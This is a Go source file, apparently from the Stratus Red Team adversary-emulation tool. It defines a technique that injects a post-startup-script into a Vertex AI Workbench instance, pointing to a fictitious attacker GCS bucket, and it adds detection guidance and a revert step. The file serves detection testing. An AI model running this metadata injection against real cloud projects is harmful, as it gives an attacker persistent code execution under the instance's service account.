package gcp

import (
	"context"
	"crypto/rand"
	_ "embed"
	"encoding/hex"
	"fmt"
	"log"
	"maps"
	"time"

	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	notebooks "google.golang.org/api/notebooks/v2"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "gcp.execution.modify-vertex-notebook-startup",
		FriendlyName: "Inject a Malicious Startup Script into a Vertex AI Workbench Instance",
		Description: `
Modifies a Vertex AI Workbench (user-managed notebook) instance to execute a
remote script on the next start by injecting a malicious URL into the instance's
<code>post-startup-script</code> metadata field. An attacker with
<code>notebooks.instances.update</code> permission can use this technique to
achieve persistent code execution inside the notebook environment, run under
the instance's service account identity.

Warm-up:

- Create a Vertex AI Workbench instance (<code>e2-standard-2</code>, us-central1-a)

Detonation:

- Patch the Workbench instance's GCE setup metadata to set
  <code>post-startup-script</code> to a fictitious attacker-controlled GCS URI
  (<code>gs://evil-attacker-&lt;project-id&gt;-&lt;random&gt;/malicious.sh</code>)

Revert:

- Remove the <code>post-startup-script</code> metadata key from the instance

References:

- https://cloud.google.com/vertex-ai/docs/workbench/user-managed/manage-notebooks-introduction
- https://cloud.google.com/vertex-ai/docs/workbench/reference/rest/v2/projects.locations.instances/patch
`,
		Detection: `
Identify when a Vertex AI Workbench instance's metadata is modified by monitoring
for <code>google.cloud.notebooks.v2.NotebookService.UpdateInstance</code> events in
GCP Admin Activity audit logs. Alert when the <code>post-startup-script</code> or
<code>startup-script</code> metadata fields are added or changed to external URLs,
which may indicate an attempt to establish persistent code execution in the notebook
environment.
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               false,
		IsSlow:                     true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Execution, mitreattack.PrivilegeEscalation},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func newNotebooksService(ctx context.Context, providers stratus.CloudProviders) (*notebooks.Service, error) {
	svc, err := notebooks.NewService(ctx, providers.GCP().Options())
	if err != nil {
		return nil, fmt.Errorf("failed to create Notebooks client: %w", err)
	}
	return svc, nil
}

func instancePath(projectId, location, instanceName string) string {
	return fmt.Sprintf("projects/%s/locations/%s/instances/%s", projectId, location, instanceName)
}

// waitForNotebooksOperation polls a Notebooks long-running operation until it
// completes or the maximum number of attempts is reached.
func waitForNotebooksOperation(ctx context.Context, svc *notebooks.Service, opName string) error {
	const maxAttempts = 60
	const pollInterval = 10 * time.Second

	for attempt := range maxAttempts {
		op, err := svc.Projects.Locations.Operations.Get(opName).Context(ctx).Do()
		if err != nil {
			return fmt.Errorf("failed to poll Notebooks operation %s: %w", opName, err)
		}
		if op.Done {
			if op.Error != nil {
				return fmt.Errorf("Notebooks operation %s failed: %s", opName, op.Error.Message)
			}
			return nil
		}
		log.Printf("Waiting for Notebooks patch operation to complete (attempt %d/%d)\n", attempt+1, maxAttempts)
		time.Sleep(pollInterval)
	}
	return fmt.Errorf("Notebooks operation %s did not complete after %d attempts", opName, maxAttempts)
}

func setPostStartupScript(ctx context.Context, svc *notebooks.Service, projectId, location, instanceName, scriptURL string) error {
	path := instancePath(projectId, location, instanceName)

	// Fetch the current instance to preserve any existing GCE setup fields.
	instance, err := svc.Projects.Locations.Instances.Get(path).Context(ctx).Do()
	if err != nil {
		return fmt.Errorf("failed to get Workbench instance %s: %w", path, err)
	}

	// Preserve existing metadata and inject / remove the post-startup-script key.
	metadata := make(map[string]string)
	if instance.GceSetup != nil && instance.GceSetup.Metadata != nil {
		maps.Copy(metadata, instance.GceSetup.Metadata)
	}

	if scriptURL == "" {
		delete(metadata, "post-startup-script")
	} else {
		metadata["post-startup-script"] = scriptURL
	}

	patchedGceSetup := &notebooks.GceSetup{
		Metadata: metadata,
	}

	op, err := svc.Projects.Locations.Instances.Patch(path, &notebooks.Instance{
		GceSetup: patchedGceSetup,
	}).UpdateMask("gceSetup.metadata").Context(ctx).Do()
	if err != nil {
		return fmt.Errorf("failed to patch Workbench instance %s: %w", path, err)
	}

	return waitForNotebooksOperation(ctx, svc, op.Name)
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	gcp := providers.GCP()
	projectId := gcp.GetProjectId()
	instanceName := params["instance_name"]
	location := params["location"]
	ctx := context.Background()

	svc, err := newNotebooksService(ctx, providers)
	if err != nil {
		return err
	}

	// The post-startup-script field only accepts gs:// URIs — the script is fetched
	// from GCS when the instance boots, so GCP does not validate the bucket exists at
	// patch time. Using a fictitious attacker-controlled bucket simulates the attack.
	// GCS bucket names are globally unique, so a random suffix is added to the project
	// ID to prevent a third party from pre-registering the bucket name.
	var nonce [4]byte
	if _, err = rand.Read(nonce[:]); err != nil {
		return fmt.Errorf("failed to generate random nonce: %w", err)
	}
	maliciousURL := fmt.Sprintf("gs://evil-attacker-%s-%s/malicious.sh", projectId, hex.EncodeToString(nonce[:]))
	log.Printf("Injecting post-startup-script %s into Workbench instance %s\n", maliciousURL, instanceName)
	if err = setPostStartupScript(ctx, svc, projectId, location, instanceName, maliciousURL); err != nil {
		return err
	}

	log.Printf("Successfully injected malicious startup script into Workbench instance %s — script will execute on next start\n", instanceName)
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	gcp := providers.GCP()
	projectId := gcp.GetProjectId()
	instanceName := params["instance_name"]
	location := params["location"]
	ctx := context.Background()

	svc, err := newNotebooksService(ctx, providers)
	if err != nil {
		return err
	}

	log.Printf("Removing post-startup-script from Workbench instance %s\n", instanceName)
	if err = setPostStartupScript(ctx, svc, projectId, location, instanceName, ""); err != nil {
		return err
	}

	log.Printf("Successfully removed malicious startup script from Workbench instance %s\n", instanceName)
	return nil
}
